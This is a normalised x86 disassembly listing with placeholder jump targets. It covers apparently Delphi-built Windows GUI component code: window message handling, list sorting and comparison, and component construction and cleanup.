mov [ esp + 0x8 ] eax
mov eax ebx
call sub_437d98
mov edx esp
call sub_429e48
test eax eax
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x28
call sub_402b5c
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_439d48
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_437e24
push ebx
add esp 0xffffffe8
mov ebx eax
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
mov eax ebx
call sub_437d98
mov ecx esp
or edx 0xffffffff
call sub_429ee0
add esp 0x18
pop ebx
retn
sub_437ea0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x229 ]
mov [ eax + 0x288 ] dl
xor edx edx
call sub_43b214
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4192f0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x288 ]
call sub_43b214
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4192f0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
call sub_437d98
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439a38
test al al
je r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
xor eax eax
push ebp
push sub_438021
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0xb
mov eax [ ebp - 0x4 ]
call sub_437d98
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x0
retn
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439a44
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebx + 0x20 ] eax
mov eax ebx
call sub_436e6c
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_436d14
inc edi
dec esi
jne r-xdata
mov edx eax
mov eax ebx
call sub_436ea0
xor eax eax
mov [ ebx + 0x20 ] eax
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x264 ]
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_437044
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_437044
mov ebx eax
mov eax [ ebx + 0x20 ]
test eax eax
jge r-xdata
sub_438078
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_418bac
mov eax edi
call sub_437e68
mov ebp ebx
mov eax ebp
call sub_437d74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_437da4
push eax
mov eax edi
call sub_437d18
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_4380d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_437d74
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437d74
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437d74
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437d74
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_437da4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_437da4
pop edx
call sub_437bb0
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_438168
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418c98
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_4383cc
push ebp
call sub_4380d8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4381bd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4383aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_437e68
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax ebx
call sub_41acf0
mov eax [ ebp - 0xc ]
call sub_407cac
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_438388
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ecx [ ebp - 0xc ]
sub ecx 0x4
mov eax [ ebp - 0x14 ]
lea edx [ eax + 0x4 ]
mov eax ebx
call sub_41acf0
mov eax [ ebp - 0x14 ]
add eax 0x8
mov [ ebp - 0x18 ] eax
xor ebx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx eax
sub edx [ ebp - 0x14 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43838f
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_437d74
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x10 ]
add [ ebp - 0x18 ] eax
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_437d18
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
add edx 0x14
call sub_4041b4
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
call sub_4377b8
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_437970
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_437970
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx 0x2
mov eax [ ebp - 0x20 ]
call sub_437970
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_437868
mov eax [ ebp - 0x18 ]
lea ebx [ eax + 0x14 ]
xor eax eax
mov al [ ebx ]
inc eax
add ebx eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0xc ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_4041b4
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
mov al [ ebx ]
lea edx [ eax + 0x1 ]
add [ ebp - 0x10 ] edx
add ebx edx
dec esi
jne r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
xor ebx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437da4
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
movsx ecx [ edi ]
mov edx ebx
mov eax [ ebp - 0x24 ]
call sub_437c44
add edi 0x2
inc ebx
dec esi
jne r-xdata
sub_4383cc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438661
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10 ] 0x8
mov eax [ ebp - 0x4 ]
call sub_437d74
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
call sub_407cac
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_43863f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
call sub_437d74
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x1c ]
add eax 0x8
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
call sub_437d74
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_437d74
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x14 ]
add eax 0x15
add [ ebp - 0x10 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_41ad28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438646
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026fc
retn
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x18 ]
add [ ebp - 0x20 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437da4
mov eax [ eax + 0x24 ]
call sub_4383b8
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437da4
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437da4
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x34 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4383b8
inc eax
add [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x2
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437da4
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x24 ]
mov ecx 0xff
call sub_4041ec
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
inc eax
add [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
lea ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x24 ]
mov ecx 0xff
call sub_4041ec
mov eax [ ebp - 0x24 ]
movzx eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
add [ ebp - 0x18 ] eax
add [ ebp - 0x24 ] eax
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437da4
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_437c38
mov [ edi ] ax
add edi 0x2
inc esi
dec ebx
jne r-xdata
sub_4386ac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
mov [ edi + 0x4 ] esi
xor edx edx
mov eax edi
call sub_438720
xor edx edx
mov eax edi
call sub_438734
mov dl 0x1
mov eax edi
call sub_438748
mov eax edi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_43875c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4376cc
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
call sub_404410
push eax
mov eax [ ebx + 0x24 ]
call sub_404410
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4376cc
mov esi eax
mov eax ebx
call sub_4376cc
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2ec ]
call [ esi + 0x2e8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4387c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c448
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xfa
mov eax ebx
call sub_4495dc
mov edx 0x96
mov eax ebx
call sub_449600
mov dl 0x1
mov eax ebx
call sub_4396b0
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x128 ]
xor edx edx
mov eax ebx
call sub_449fe4
mov dl 0x1
mov eax ebx
call sub_450950
mov dl 0x1
mov eax ebx
call sub_439a90
mov dl 0x1
mov eax ebx
call sub_439734
mov dl 0x1
mov eax ebx
call sub_4396c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov esi eax
mov [ ebx + 0x210 ] esi
mov eax esi
mov edx ebx
call sub_4489fc
mov [ ebx + 0x26c ] 0xffffffff
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437000
mov [ ebx + 0x23c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xfc ]
mov [ ebx + 0x22c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov [ ebx + 0x28c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4386ac
mov [ ebx + 0x234 ] eax
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419638
mov [ ebx + 0x290 ] eax
mov [ ebx + 0x294 ] 0x0
mov [ ebx + 0x295 ] 0x0
xor eax eax
mov [ ebx + 0x2a0 ] eax
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_456cdc
mov [ ebx + 0x224 ] eax
push ebx
push sub_439238
call sub_460980
mov [ ebx + 0x250 ] eax
push ebx
push sub_439140
call sub_460980
mov [ ebx + 0x25c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438f1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ ebx + 0x280 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438f1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ ebx + 0x284 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438f1c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4389b0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax [ esi + 0x224 ]
call sub_403154
mov eax [ esi + 0x23c ]
call sub_403154
mov eax [ esi + 0x28c ]
call sub_403154
mov eax [ esi + 0x22c ]
call sub_403154
mov eax [ esi + 0x234 ]
call sub_403154
mov eax [ esi + 0x240 ]
call sub_403154
mov eax [ esi + 0x248 ]
call sub_403154
mov eax [ esi + 0x24c ]
call sub_403154
mov eax [ esi + 0x290 ]
call sub_403154
mov eax [ esi + 0x250 ]
call sub_460994
mov eax [ esi + 0x264 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ esi + 0x25c ]
call sub_460994
mov eax [ esi + 0x27c ]
call sub_403154
mov eax [ esi + 0x280 ]
call sub_403154
mov eax [ esi + 0x284 ]
call sub_403154
mov eax [ esi + 0x210 ]
call sub_403154
xor eax eax
mov [ esi + 0x210 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c56c
test bl bl
jle r-xdata
mov edx [ esi + 0x260 ]
push edx
push 0xfffffffc
push eax
call SetWindowLongA
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_438ab0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_435188
mov edx esi
mov eax ebx
call sub_44d5a8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44d4d4
mov edx [ esi + 0x4 ]
or edx 0x2000000
xor ecx ecx
mov cl [ ebx + 0x215 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x214 ]
or edx [ ecx * 4 + rw-data ]
mov eax [ ebx + 0x234 ]
xor ecx ecx
mov cl [ eax + 0x8 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x216 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x228 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x238 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x9 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0xa ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22b ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22a ]
or edx [ eax * 4 + rw-data ]
or edx 0x40
mov [ esi + 0x4 ] edx
cmp [ ebx + 0x244 ] 0x0
je r-xdata
cmp [ ebx + 0x245 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x1000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x400
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_438bdc
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_41924c
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b53c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438c64
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41db58
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
call sub_41c210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_438c90
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d6d4
mov eax [ ebp - 0x4 ]
call sub_439358
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_439768
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_439748
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x268 ]
mov eax [ ebp - 0x4 ]
call sub_43979c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_437094
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x218 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437e88
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x1
xor eax eax
push ebp
push sub_438dba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_41924c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ ebp - 0x4 ]
call sub_41ae54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x21c ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_456e54
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2a0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437e4c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x220 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_456e54
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_456f90
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_438ef4
push ebp
call sub_438bdc
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_449f14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438064
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_439454
mov eax [ ebp - 0x4 ]
call sub_43b9a0
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_456e54
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_456f90
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_438ef4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_456f90
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_438ef4
sub_438e78
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41ab48
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x240 ] eax
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x240 ]
call sub_41aeb4
push 0x0
push 0x0
mov eax [ ebx + 0x240 ]
call sub_41aae4
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_437d74
mov [ ebx + 0x2a0 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_44dab8
pop ebx
retn
mov eax ebx
call sub_4394e0
sub_438ef4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45071c
mov ecx edi
mov edx esi
call sub_429e18
sub_438f1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_456e54
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_456f90
jmp r-xdata
cmp esi [ ebx + 0x21c ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_438ef4
jmp r-xdata
cmp esi [ ebx + 0x218 ]
jne r-xdata
cmp esi [ ebx + 0x220 ]
jne r-xdata
mov ecx 0x1
mov edx eax
mov eax ebx
call sub_438ef4
jmp r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_438ef4
sub_438f90
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4492f0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x218 ]
jne r-xdata
cmp esi [ edi + 0x21c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43b29c
cmp esi [ edi + 0x220 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43b30c
xor edx edx
mov eax edi
call sub_43b384
sub_439004
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_439134
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4192f0
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405104
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4192f0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45071c
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42a1d4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_439111
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4192f0
mov esi eax
dec esi
test esi esi
